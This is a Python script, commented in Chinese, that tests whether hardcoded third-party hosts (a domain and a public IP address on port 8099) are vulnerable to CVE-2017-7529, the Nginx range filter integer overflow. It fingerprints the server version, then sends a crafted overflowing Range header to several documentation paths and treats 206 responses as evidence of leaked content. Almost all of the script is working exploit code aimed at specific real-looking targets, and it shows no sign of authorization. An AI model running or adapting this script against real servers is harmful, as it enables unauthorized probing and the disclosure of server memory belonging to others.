#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
CVE-2017-7529 Nginx 整数溢出漏洞验证
- Nginx range filter 整数溢出
- 通过特制 Range 头触发信息泄露
"""

import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

TARGETS = [
    "https://hjyl.jsmcxx.com:8099",
    "https://112.4.210.148:8099",
]

# CVE-2017-7529 的关键 Range 头
MALICIOUS_RANGE = "bytes=-3758,-9223372036854772050"

PATHS = [
    "/docs/architecture/",
    "/docs/",
    "/docs/index.html",
    "/docs/setup.html",
]

print("=" * 70)
print("  CVE-2017-7529 Nginx 整数溢出漏洞验证")
print("=" * 70)
print()

for target in TARGETS:
    print(f"\n{'='*70}")
    print(f"  目标: {target}")
    print(f"{'='*70}")

    # 第1步：版本检测
    print(f"\n[第1步] 版本检测")
    print("-" * 70)
    try:
        resp = requests.get(f"{target}/docs/", verify=False, timeout=10,
                          headers={"User-Agent": "Mozilla/5.0"})
        server_header = resp.headers.get("Server", "未获取到")
        print(f"  Server头: {server_header}")
        print(f"  状态码: {resp.status_code}")

        # 解析版本
        if "nginx/" in server_header.lower():
            version = server_header.split("nginx/")[1].split()[0] if "nginx/" in server_header else "unknown"
            print(f"  Nginx版本: {version}")

            # CVE-2017-7529 影响范围：0.5.6 - 1.13.2
            # 但修复可能不完全，需要实际测试
            major, minor, patch = 0, 0, 0
            parts = version.split(".")
            if len(parts) >= 3:
                major, minor, patch = int(parts[0]), int(parts[1]), int(parts[2])

            print(f"  版本分析: nginx/{major}.{minor}.{patch}")
            if major == 1 and minor <= 13 and patch <= 2:
                print(f"  版本判断: ✅ 在受影响范围内 (0.5.6 - 1.13.2)")
            elif major == 1 and minor == 24:
                print(f"  版本判断: nginx 1.24.0 理论上已修复CVE-2017-7529")
                print(f"           但需要实际测试确认是否真的修复")
        else:
            print(f"  ⚠️ 未检测到Nginx标识，可能是其他Web服务器")
    except Exception as e:
        print(f"  ❌ 连接失败: {e}")
        continue

    # 第2步：正常请求（对照组）
    print(f"\n[第2步] 正常请求（对照组）")
    print("-" * 70)
    for path in PATHS[:2]:
        try:
            resp = requests.get(f"{target}{path}", verify=False, timeout=10,
                              headers={"User-Agent": "Mozilla/5.0"})
            print(f"  {path} -> {resp.status_code} | {len(resp.content)} bytes")
        except Exception as e:
            print(f"  {path} -> 错误: {e}")

    # 第3步：CVE-2017-7529 整数溢出测试
    print(f"\n[第3步] CVE-2017-7529 整数溢出测试")
    print("-" * 70)
    print(f"  Range头: {MALICIOUS_RANGE}")

    for path in PATHS:
        try:
            headers = {
                "User-Agent": "Mozilla/5.0",
                "Range": MALICIOUS_RANGE,
                "Connection": "close",
            }
            resp = requests.get(f"{target}{path}", headers=headers, verify=False, timeout=10)

            print(f"\n  路径: {path}")
            print(f"  状态码: {resp.status_code}")
            print(f"  Content-Length: {len(resp.content)} bytes")
            print(f"  Content-Type: {resp.headers.get('Content-Type', 'N/A')}")

            # 判断漏洞
            if resp.status_code == 206:
                content_range = resp.headers.get("Content-Range", "")
                print(f"  Content-Range: {content_range}")

                if len(resp.content) > 0:
                    # 检查是否泄露了文件内容
                    content_preview = resp.text[:200]
                    if "<!DOCTYPE" in content_preview or "<html" in content_preview:
                        print(f"  ✅ 漏洞存在！响应包含文件内容泄露")
                        print(f"  泄露内容预览: {content_preview[:100]}...")
                    else:
                        print(f"  ⚠️ 返回206但未确认泄露内容")
                else:
                    print(f"  ⚠️ 返回206但响应体为空")

            elif resp.status_code == 416:
                print(f"  ❌ 服务器拒绝了Range请求 (416 Range Not Satisfiable)")
                print(f"  说明服务器可能已修复该漏洞")

            elif resp.status_code == 200:
                print(f"  ⚠️ 返回200，服务器忽略了Range头")
                print(f"  说明可能有反向代理/WAF拦截")

            else:
                print(f"  ❓ 未知状态码: {resp.status_code}")

        except Exception as e:
            print(f"  路径 {path} -> 错误: {e}")

print(f"\n{'='*70}")
print(f"  验证完成")
print(f"{'='*70}")
